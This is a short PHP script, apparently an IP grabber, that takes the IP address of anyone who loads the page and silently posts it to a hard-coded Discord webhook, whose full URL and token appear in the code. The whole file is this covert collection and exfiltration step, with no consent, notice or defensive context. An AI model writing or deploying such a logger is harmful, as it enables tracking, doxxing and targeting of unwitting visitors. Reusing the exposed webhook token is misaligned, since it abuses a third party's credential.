<?php
/* Ragekill3377 */

$ip = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER['REMOTE_ADDR'];
$wh = "https://discord.com/api/webhooks/1321051594963550218/jrCE9j6nRnDfddYhiOmA2D9JPIRi1l3Sxgn5sTt8OvgMXLfykYM1pw9vJWO0UQmHoqlf";

$embed = json_encode([
    "username" => $ip,
    "content" => "IP: $ip"
]);

$c = curl_init($wh);
curl_setopt($c, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($c, CURLOPT_POSTFIELDS, $embed);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_exec($c);
curl_close($c);
?>
